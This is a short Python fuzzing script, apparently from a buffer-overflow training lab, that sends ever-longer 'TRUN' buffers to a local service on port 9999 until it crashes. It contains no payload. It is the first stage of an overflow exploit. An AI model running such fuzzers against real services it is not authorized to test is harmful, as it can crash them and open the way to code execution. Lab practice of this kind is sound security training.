#!/bin/python3

import sys, socket
from time import sleep
from termcolor import colored
from pwn import *

context.log_level = 'error'
buffer = "A" * 100

while True:
    try:
       # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       # s.connect(('127.0.0.1, 9999')) 
       # s.send(('TRUN /.:/' + buffer).encode())
        s = remote('127.0.0.1', 9999)
        s.sendline(('TRUN /.:/' + buffer).encode())
        s.close()
        sleep(1)
        #print(colored("[!]",'green'), "Curret buffer length:" + colored({},'red').format(len(buffer)), "bytes")
        buffer = buffer + "A" * 100
    except:
        print("[!] Fuzzing Crashed at {} bytes".format(len(buffer)))
        sys.exit()
